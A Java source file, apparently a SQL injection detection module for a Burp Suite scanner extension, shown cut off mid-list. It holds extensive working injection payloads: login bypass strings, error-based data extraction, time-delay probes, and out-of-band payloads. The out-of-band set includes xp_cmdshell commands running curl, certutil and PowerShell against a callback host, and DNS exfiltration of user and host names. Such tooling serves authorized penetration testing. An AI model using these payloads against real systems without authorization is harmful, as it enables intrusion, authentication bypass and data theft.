package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.TimingLock;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 5: Smart SQLi Detector
 * Comprehensive SQL injection detection covering error-based, union-based,
 * time-based blind, boolean-based blind, and OOB (Burp Collaborator) techniques.
 * 6 detection phases with configurable toggles for each.
 */
public class SmartSqliDetector implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Tested parameters tracking
    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    // SQL error patterns by DB type
    private static final Map<String, List<Pattern>> ERROR_PATTERNS = new LinkedHashMap<>();

    static {
        ERROR_PATTERNS.put("MySQL", List.of(
                Pattern.compile("SQL syntax.*?MySQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysql_fetch", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysql_num_rows", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MySQL server version", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysqli_", Pattern.CASE_INSENSITIVE),
                Pattern.compile("You have an error in your SQL syntax", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MariaDB server version", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("PostgreSQL", List.of(
                Pattern.compile("PostgreSQL.*?ERROR", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_query", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_exec", Pattern.CASE_INSENSITIVE),
                Pattern.compile("valid PostgreSQL result", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unterminated quoted string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("MSSQL", List.of(
                Pattern.compile("Microsoft SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ODBC SQL Server", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLServer JDBC", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mssql_query", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Microsoft OLE DB Provider", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Oracle", List.of(
                Pattern.compile("ORA-\\d{5}", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Oracle error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("SQLite", List.of(
                Pattern.compile("SQLite.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("sqlite3\\.OperationalError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLITE_ERROR", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unrecognized token", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("DB2", List.of(
                Pattern.compile("DB2 SQL error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLCODE=-\\d+", Pattern.CASE_INSENSITIVE),
                Pattern.compile("com\\.ibm\\.db2", Pattern.CASE_INSENSITIVE),
                Pattern.compile("CLI Driver.*?DB2", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Sybase", List.of(
                Pattern.compile("Sybase message", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Adaptive Server Enterprise", Pattern.CASE_INSENSITIVE),
                Pattern.compile("sybsystemprocs", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Informix", List.of(
                Pattern.compile("com\\.informix\\.jdbc", Pattern.CASE_INSENSITIVE),
                Pattern.compile("INFORMIX-SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ifx_", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Firebird", List.of(
                Pattern.compile("Dynamic SQL Error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Firebird.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("isc_dsql_error", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("CockroachDB", List.of(
                Pattern.compile("cockroach.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("CRDB", Pattern.CASE_INSENSITIVE)
        ));
        // Generic patterns — only include SQL-specific ones; removed OperationalError, DatabaseError,
        // ProgrammingError, DataError, IntegrityError, division by zero (too generic, match non-SQL errors)
        ERROR_PATTERNS.put("Generic", List.of(
                Pattern.compile("syntax error.*?SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unexpected end of SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLSTATE\\[", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Warning.*?\\b(sql|query|fetch|num_rows)\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Syntax error or access violation", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid input syntax for", Pattern.CASE_INSENSITIVE),
                Pattern.compile("near \".*?\": syntax error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("PDOException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("java\\.sql\\.SQLException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("System\\.Data\\.SqlClient", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Npgsql\\.PostgresException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("org\\.hibernate", Pattern.CASE_INSENSITIVE),
                Pattern.compile("jdbc\\.SQLServerException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bSQLException\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("supplied argument is not a valid", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Column count doesn't match", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unknown column", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Table .* doesn't exist", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Data truncated for column", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Duplicate entry", Pattern.CASE_INSENSITIVE)
        ));
    }

    // Error-based payloads
    private static final String[] ERROR_PAYLOADS = {
            // Basic quote/syntax probes
            "'", "''", "\"", "\\", "`",
            "' -- -", "\" -- -",
            "';", "\";",
            // Classic OR/AND probes
            "1 OR 1=1", "1' OR '1'='1", "1; --",
            "' OR ''='", "1' OR 1=1-- -", "1\" OR 1=1-- -",
            // CONVERT/CAST error extraction (MSSQL)
            "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
            "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
            "1' AND 1=CONVERT(int,(SELECT user))-- -",
            "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
            // CAST error extraction (PostgreSQL/MSSQL)
            "1' AND 1=CAST((SELECT version()) AS int)-- -",
            "1' AND CAST((SELECT 1) AS int)=1-- -",
            "1 AND 1=CAST('a' AS int)-- -",
            // Basic UNION probe
            "' UNION SELECT NULL-- -",
            // MySQL extractvalue/updatexml error extraction
            "' AND extractvalue(1,concat(0x7e,version()))-- -",
            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
            "1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
            "1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
            // MySQL EXP overflow (MySQL 5.5.5+)
            "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
            // MySQL GTID_SUBSET error
            "' AND GTID_SUBSET(version(),0)-- -",
            // MySQL JSON error extraction (5.7+)
            "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))-- -",
            // MySQL geometry functions error
            "' AND ST_LatFromGeoHash(version())-- -",
            "' AND ST_LongFromGeoHash(version())-- -",
            // PostgreSQL error extraction
            "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
            "1' AND 1::int=2::text-- -",
            // Oracle error extraction
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            // SQLite error extraction
            "' AND 1=LOAD_EXTENSION('a')-- -",
            // Space bypass via comment, newline, plus, tab
            "1'/**/OR/**/1=1-- -",
            "1'%0aOR%0a1=1-- -",
            "1'+OR+1=1-- -",
            "1'%09OR%091=1-- -",
            "1'%0bOR%0b1=1-- -",
            "1'%0cOR%0c1=1-- -",
            "1'%a0OR%a01=1-- -",
            // Stacked query probes
            "1';SELECT+1-- -",
            "1\";SELECT+1-- -",
            "1;SELECT 1-- -",
            // Parenthetical grouping
            "1')OR('1'='1",
            "1'))OR(('1'='1",
            "1') OR 1=1-- -",
            "1')) OR 1=1-- -",
            "1') AND ('1'='1",
            "1%') OR 1=1-- -",
            // Backslash escape variants (MySQL NO_BACKSLASH_ESCAPES)
            "\\'", "\\\\'",
            // Null byte
            "%00'",
            // Wildcard LIKE probe
            "' LIKE '",
            "' NOT LIKE '",
            // Math/arithmetic error probes
            "1/0", "' OR 1/0-- -",
            "1' AND 1/0-- -",
            // HAVING/GROUP BY error extraction
            "' HAVING 1=1-- -",
            "' GROUP BY 1 HAVING 1=1-- -",
            "1' ORDER BY 1,SLEEP(0)-- -",
            // MySQL INTO error
            "' INTO @a-- -",
            "' INTO OUTFILE '/dev/null'-- -",
            // Double-query error injection
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            // MSSQL specific
            "1' AND 1=@@SERVERNAME-- -",
            "1'; EXEC xp_msver-- -",
            // Inline comment injection
            "1'/*!50000OR*/1=1-- -",
            "1'/*!OR*/1=1-- -",
            // Scientific notation edge case
            "1e0' OR '1'='1",
            "1e0\" OR \"1\"=\"1",
    };

    // Time-based payloads by DB
    private static final Map<String, String[]> TIME_PAYLOADS;
    static {
        Map<String, String[]> tp = new LinkedHashMap<>();
        tp.put("MySQL", new String[]{
                // Basic SLEEP
                "' OR SLEEP(18)-- -", "1' AND SLEEP(18)-- -", "\" OR SLEEP(18)-- -",
                "1 AND SLEEP(18)-- -", "' OR SLEEP(18)#",
                // Comment-as-space bypass
                "'/**/OR/**/SLEEP(18)#",
                "1'/**/AND/**/SLEEP(18)-- -",
                // Conditional SLEEP with IF
                "' AND IF(1=1,SLEEP(18),0)-- -",
                "' AND IF(1=1,SLEEP(18),0)#",
                "1' AND IF(1=1,SLEEP(18),0)-- -",
                "\" AND IF(1=1,SLEEP(18),0)-- -",
                "1 AND IF(1=1,SLEEP(18),0)-- -",
                // Conditional SLEEP with CASE
                "' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
                "1' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
                // Subquery wrapper (WAF bypass)
                "' AND (SELECT SLEEP(18))-- -",
                "1' AND (SELECT SLEEP(18))-- -",
                "' AND (SELECT * FROM (SELECT SLEEP(18))a)-- -",
                "1' AND (SELECT * FROM (SELECT(SLEEP(18)))a)-- -",
                // BENCHMARK alternative (when SLEEP is disabled)
                "' AND BENCHMARK(10000000,SHA1('test'))-- -",
                "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
                "' AND BENCHMARK(5000000,MD5('test'))-- -",
                // SLEEP in UNION
                "' UNION SELECT SLEEP(18)-- -",
                "' UNION SELECT SLEEP(18),NULL-- -",
                // Parenthetical grouping
                "') OR SLEEP(18)-- -",
                "')) OR SLEEP(18)-- -",
                "') AND SLEEP(18)-- -",
                // Inline comment bypass
                "'/*!50000AND*/SLEEP(18)-- -",
                "'/*!SLEEP(18)*/-- -",
                // Newline bypass
                "'%0aOR%0aSLEEP(18)-- -",
                // ELT/MAKE_SET based (alternative delay)
                "' AND ELT(1=1,SLEEP(18))-- -",
                // Stacked query with SLEEP
                "'; SELECT SLEEP(18)-- -",
                "1'; SELECT SLEEP(18)-- -",
        });
        tp.put("PostgreSQL", new String[]{
                // Basic PG_SLEEP
                "'; SELECT PG_SLEEP(18)-- -", "1'; SELECT PG_SLEEP(18)-- -",
                "' || (SELECT PG_SLEEP(18))-- -",
                // Comment-as-space bypass
                "';/**/SELECT/**/PG_SLEEP(18)-- -",
                // Conditional PG_SLEEP with CASE
                "' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
                "1' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
                "' AND CASE WHEN 1=1 THEN CAST((SELECT PG_SLEEP(18)) AS text) ELSE '0' END='0'-- -",
                // Subquery wrapper
                "' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
                "1' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
                "' AND 1=(SELECT 1 FROM PG_SLEEP(18))-- -",
                // Stacked query variants
                "\"; SELECT PG_SLEEP(18)-- -",
                "1; SELECT PG_SLEEP(18)-- -",
                // generate_series based delay
                "'; SELECT COUNT(*) FROM generate_series(1,10000000)-- -",
                // Parenthetical grouping
                "'); SELECT PG_SLEEP(18)-- -",
                "')); SELECT PG_SLEEP(18)-- -",
                // PG_SLEEP in WHERE
                "' AND PG_SLEEP(18)::text='1'-- -",
        });
        tp.put("MSSQL", new String[]{
                // Basic WAITFOR DELAY
                "'; WAITFOR DELAY '0:0:18'-- -", "1'; WAITFOR DELAY '0:0:18'-- -",
                "' WAITFOR DELAY '0:0:18'-- -",
                // Comment-as-space bypass
                "';/**/WAITFOR/**/DELAY/**/'0:0:18'-- -",
                // Double quote variant
                "\"; WAITFOR DELAY '0:0:18'-- -",
                // No-quote (integer injection)
                "1; WAITFOR DELAY '0:0:18'-- -",
                // Conditional WAITFOR with IF
                "'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
                "1'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
                "'; IF 1=1 WAITFOR DELAY '0:0:18'-- -",
                // Conditional with CASE
                "'; DECLARE @d VARCHAR(10);SET @d=CASE WHEN 1=1 THEN '0:0:18' ELSE '0:0:0' END;WAITFOR DELAY @d-- -",
                // Stacked query variants
                "1; WAITFOR DELAY '0:0:18'-- -",
                // Parenthetical grouping
                "'); WAITFOR DELAY '0:0:18'-- -",
                "')); WAITFOR DELAY '0:0:18'-- -",
                // WAITFOR TIME (wait until a time, less common but works)
                "'; WAITFOR DELAY '00:00:18'-- -",
                // Heavy query alternative (no WAITFOR needed)
                "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
        });
        tp.put("SQLite", new String[]{
                // RANDOMBLOB heavy computation
                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
                "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
                "\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
                // Alternative heavy computation
                "' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -",
                // ZEROBLOB variant
                "' AND 1=LIKE('A',HEX(ZEROBLOB(500000000)))-- -",
        });
        tp.put("Oracle", new String[]{
                // DBMS_PIPE.RECEIVE_MESSAGE
                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
                // Conditional with CASE
                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',18) ELSE 0 END=1-- -",
                // DBMS_LOCK.SLEEP (requires DBA privilege)
                "'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
                "1'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
                // UTL_INADDR heavy DNS lookup
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')-- -",
                // Heavy query (cross join)
                "' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<=10000000)-- -",
                // DBMS_SESSION.SLEEP (12c+)
                "'; BEGIN DBMS_SESSION.SLEEP(18); END;-- -",
                // httpuritype timeout
                "' AND 1=HTTPURITYPE('http://10.255.255.1/').GETCLOB()-- -",
        });
        TIME_PAYLOADS = Collections.unmodifiableMap(tp);
    }

    // Boolean-based payload pairs: [true, false]
    private static final String[][] BOOLEAN_PAIRS = {
            // Basic single-quote AND
            {"1' AND '1'='1", "1' AND '1'='2"},
            // Integer AND
            {"1 AND 1=1", "1 AND 1=2"},
            // Single-quote OR
            {"' OR '1'='1' -- -", "' OR '1'='2' -- -"},
            // Integer OR
            {"1 OR 1=1", "1 OR 1=2"},
            // Double-quote AND
            {"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
            // Comment-as-space bypass
            {"1'/**/AND/**/'1'='1", "1'/**/AND/**/'1'='2"},
            {"1'/**/OR/**/'1'='1", "1'/**/OR/**/'1'='2"},
            // Parenthetical grouping
            {"1')AND('1'='1", "1')AND('1'='2"},
            {"1'))AND(('1'='1", "1'))AND(('1'='2"},
            {"1') AND 1=1-- -", "1') AND 1=2-- -"},
            // Bare AND with comment terminator
            {"1 AND 1=1-- -", "1 AND 1=2-- -"},
            // LIKE-based
            {"1' AND 'a' LIKE 'a", "1' AND 'a' LIKE 'b"},
            {"' OR 'a' LIKE 'a' -- -", "' OR 'a' LIKE 'b' -- -"},
            // BETWEEN-based
            {"1' AND 1 BETWEEN 1 AND 1-- -", "1' AND 1 BETWEEN 2 AND 3-- -"},
            // Regex-based (MySQL)
            {"1' AND 'a' REGEXP 'a'-- -", "1' AND 'a' REGEXP 'b'-- -"},
            // SIMILAR TO (PostgreSQL)
            {"1' AND 'a' SIMILAR TO 'a'-- -", "1' AND 'a' SIMILAR TO 'b'-- -"},
            // Subtraction-based (no quotes needed)
            {"1 AND 1-1=0", "1 AND 1-1=1"},
            {"1' AND 1-1=0-- -", "1' AND 1-1=1-- -"},
            // MOD-based
            {"1' AND MOD(1,1)=0-- -", "1' AND MOD(1,1)=1-- -"},
            // Conditional string comparison
            {"' AND 'a'='a' -- -", "' AND 'a'='b' -- -"},
            // NULL comparison
            {"1' AND NULL IS NULL-- -", "1' AND NULL IS NOT NULL-- -"},
            // Subquery boolean
            {"1' AND (SELECT 1)=1-- -", "1' AND (SELECT 1)=2-- -"},
            {"' OR (SELECT 1)=1-- -", "' OR (SELECT 1)=2-- -"},
            // SUBSTRING/SUBSTR probes (confirm data extraction)
            {"1' AND SUBSTRING('a',1,1)='a'-- -", "1' AND SUBSTRING('a',1,1)='b'-- -"},
            {"1' AND SUBSTR('a',1,1)='a'-- -", "1' AND SUBSTR('a',1,1)='b'-- -"},
            // ASCII comparison
            {"1' AND ASCII('a')=97-- -", "1' AND ASCII('a')=98-- -"},
            // LENGTH/CHAR_LENGTH probe
            {"1' AND LENGTH('a')=1-- -", "1' AND LENGTH('a')=2-- -"},
            // ORD probe (MySQL)
            {"1' AND ORD('a')=97-- -", "1' AND ORD('a')=98-- -"},
            // MID probe (MySQL)
            {"1' AND MID('abc',1,1)='a'-- -", "1' AND MID('abc',1,1)='b'-- -"},
            // LEFT probe
            {"1' AND LEFT('abc',1)='a'-- -", "1' AND LEFT('abc',1)='b'-- -"},
            // Inline comment bypass
            {"1'/*!AND*/'1'='1", "1'/*!AND*/'1'='2"},
            // Newline bypass
            {"1'%0aAND%0a'1'='1", "1'%0aAND%0a'1'='2"},
            // information_schema existence probe
            {"1' AND (SELECT COUNT(*) FROM information_schema.tables)>=0-- -",
             "1' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- -"},
            // Percent wildcard (LIKE injection in search)
            {"1%' AND '1'='1' -- -", "1%' AND '1'='2' -- -"},
    };

    // Auth bypass payloads — ORIGINAL_VALUE is replaced with the actual param value
    private static final String[] AUTH_BYPASS_PAYLOADS = {
            // Append comment to original value (like PortSwigger lab: administrator'--)
            "ORIGINAL_VALUE'--",
            "ORIGINAL_VALUE'-- -",
            "ORIGINAL_VALUE'#",
            "ORIGINAL_VALUE\"--",
            "ORIGINAL_VALUE\"-- -",
            "ORIGINAL_VALUE\"#",
            // Append comment with different terminators
            "ORIGINAL_VALUE')--",
            "ORIGINAL_VALUE')-- -",
            "ORIGINAL_VALUE'))--",
            // Standalone bypass payloads — single quote
            "' OR 1=1-- -",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR '1'='1'-- -",
            "' OR '1'='1'#",
            "' OR ''='",
            "' OR 'x'='x'-- -",
            "' OR 'a'='a",
            // Standalone bypass payloads — double quote
            "\" OR 1=1-- -",
            "\" OR 1=1#",
            "\" OR \"1\"=\"1\"-- -",
            // Parenthetical grouping bypasses
            "') OR ('1'='1'-- -",
            "') OR 1=1-- -",
            "') OR ('1'='1",
            "')) OR 1=1-- -",
            "')) OR (('1'='1",
            // Admin-specific
            "admin'--",
            "admin'-- -",
            "admin'#",
            "admin\"--",
            "admin')--",
            // LIMIT/TOP variants
            "' OR 1=1 LIMIT 1-- -",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1,1-- -",
            "'; SELECT TOP 1 * FROM users-- -",
            // UNION-based auth bypass
            "' UNION SELECT 1-- -",
            "' UNION SELECT 1,1-- -",
            "' UNION SELECT 1,1,1-- -",
            "' UNION SELECT NULL,NULL,NULL-- -",
            "' UNION SELECT 'admin','password'-- -",
            // Integer-based auth bypass (no quotes)
            "1 OR 1=1-- -",
            "1 OR 1=1#",
            // Comment-as-space bypass
            "'/**/OR/**/1=1-- -",
            "'/**/OR/**/'1'='1'-- -",
            // Newline bypass
            "'%0aOR%0a1=1-- -",
            // True condition bypasses
            "' OR 2>1-- -",
            "' OR 'a' LIKE 'a'-- -",
            "' OR 1 BETWEEN 0 AND 2-- -",
            "' OR NOT 0-- -",
            "' OR NOT 1=2-- -",
            // MySQL specific
            "' OR 1=1-- -",
            "' || 1=1-- -",
            "' && 1=1-- -",
            // PostgreSQL specific
            "' OR TRUE-- -",
            "' OR 1::bool-- -",
            // MSSQL specific
            "' OR 1=1;-- -",
            // Null byte before comment (edge case)
            "ORIGINAL_VALUE'%00-- -",
            // Backslash escape (MySQL NO_BACKSLASH_ESCAPES)
            "\\'OR 1=1-- -",
    };

    // Parameter names that suggest a login/auth form
    private static final Set<String> LOGIN_PARAM_NAMES = Set.of(
            "username", "user", "uname", "login", "email", "userid", "user_id",
            "user_name", "loginid", "login_id", "account", "usr", "name",
            "uid", "signin", "sign_in", "log", "logname"
    );

    // Keywords in response body that indicate successful login
    private static final String[] SUCCESS_KEYWORDS = {
            "welcome", "dashboard", "logout", "log out", "sign out", "signout",
            "my account", "my profile", "profile", "settings", "admin panel",
            "successfully", "logged in", "authenticated"
    };

    // Keywords in response body that indicate failed login
    private static final String[] FAILURE_KEYWORDS = {
            "invalid", "incorrect", "failed", "wrong", "error", "denied",
            "unauthorized", "bad credentials", "login failed", "try again",
            "invalid username", "invalid password", "authentication failed"
    };

    // OOB payloads by DB type (use COLLAB_PLACEHOLDER for Collaborator domain)
    private static final Map<String, String[]> OOB_PAYLOADS;
    static {
        Map<String, String[]> oob = new LinkedHashMap<>();
        oob.put("MySQL", new String[]{
                // LOAD_FILE with UNC path (DNS exfiltration) — string context
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,COLLAB_PLACEHOLDER,0x5c5c61))-- -",
                // INTO OUTFILE/DUMPFILE via UNC
                "' UNION SELECT 'test' INTO OUTFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
                "' UNION SELECT 'test' INTO DUMPFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
                // XML functions
                "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))))-- -",
                "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))),1)-- -",
                // LOAD_FILE via CHAR() encoding (WAF bypass)
                "' UNION SELECT LOAD_FILE(CHAR(92,92)+COLLAB_PLACEHOLDER+CHAR(92,97))-- -",
                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),COLLAB_PLACEHOLDER,CHAR(92,97)))-- -",
                // Data exfil: user() in subdomain
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                // SELECT INTO via CHAR encoding
                "' UNION SELECT 'test' INTO OUTFILE CONCAT(CHAR(92,92),COLLAB_PLACEHOLDER,CHAR(92,97))-- -",
                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.', COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                // Subquery-wrapped — no quotes (integer injection)
                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
        });
        oob.put("MSSQL", new String[]{
                // xp_dirtree (most common, enabled by default)
                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master..xp_dirtree @q-- -",
                // xp_subdirs
                "' UNION SELECT 1; EXEC master..xp_subdirs '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // xp_fileexist
                "'; EXEC master..xp_fileexist '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // xp_cmdshell (if enabled)
                "'; EXEC xp_cmdshell 'nslookup COLLAB_PLACEHOLDER'-- -",
                "'; EXEC xp_cmdshell 'ping -n 1 COLLAB_PLACEHOLDER'-- -",
                // xp_cmdshell with HTTP callbacks (curl/certutil)
                "'; EXEC xp_cmdshell 'curl http://COLLAB_PLACEHOLDER/'-- -",
                "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/ %temp%\\a'-- -",
                "'; EXEC xp_cmdshell 'powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/'-- -",
                // fn_xe_file_target_read_file / bulk insert
                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master.dbo.xp_dirtree @q,1,1-- -",
                // OPENROWSET
                "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
                // sp_OACreate + WScript.Shell (alternative OOB)
                "'; DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run','','nslookup COLLAB_PLACEHOLDER'-- -",
                // BULK INSERT from UNC path
                "'; BULK INSERT tempdb..omni FROM '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // fn_get_audit_file UNC read
                "'; SELECT * FROM sys.fn_get_audit_file('\\\\COLLAB_PLACEHOLDER\\a',DEFAULT,DEFAULT)-- -",
                // OPENROWSET BULK UNC
                "'; SELECT * FROM OPENROWSET(BULK '\\\\COLLAB_PLACEHOLDER\\a', SINGLE_CLOB) AS x-- -",
                // xp_cmdshell with data exfil (hostname in subdomain)
                "'; EXEC xp_cmdshell 'nslookup %COMPUTERNAME%.COLLAB_PLACEHOLDER'-- -",
                // Linked server OOB
                "'; EXEC sp_addlinkedserver @server='\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')) IS NOT NULL-- -",
